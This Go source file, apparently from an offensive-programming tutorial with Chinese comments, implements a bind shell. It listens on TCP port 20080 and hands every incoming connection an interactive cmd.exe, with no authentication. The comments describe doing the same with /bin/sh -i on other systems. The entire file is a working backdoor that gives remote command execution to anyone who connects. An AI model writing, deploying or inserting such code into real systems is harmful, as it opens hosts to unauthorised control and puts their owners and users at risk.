package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	/*
	 * 显示调用/bin/sh并使用-i进入交互模式
	 * 这样我们就可以用它作为标准输入和标准输出
	 * 对于windows使用exec.Command("cmd.exe")
	 */
	cmd := exec.Command("cmd.exe")
	rp, wp := io.Pipe()
	// 将标准输入设置为我们的连接
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
